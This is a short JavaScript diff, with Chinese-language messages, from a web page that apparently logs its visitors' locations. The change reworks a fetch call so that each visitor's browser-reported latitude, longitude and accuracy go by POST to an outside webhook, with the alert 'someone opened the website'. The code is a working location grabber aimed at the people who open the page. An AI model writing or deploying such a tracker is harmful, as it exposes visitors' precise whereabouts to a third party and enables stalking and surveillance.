@@ -40,7 +40,19 @@ var lat = pos.coords.latitude;
 var lon = pos.coords.longitude;
 var acc = pos.coords.accuracy;
 
-fetch(webhook + "?lat=" + lat + "&lon=" + lon + "&acc=" + acc);
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:
+"📍有人打開網站\n"+
+"緯度: "+lat+"\n"+
+"經度: "+lon+"\n"+
+"精準度: "+acc+" 公尺"
+})
+});
 
 document.getElementById("status").innerHTML=
 "定位成功<br>" +
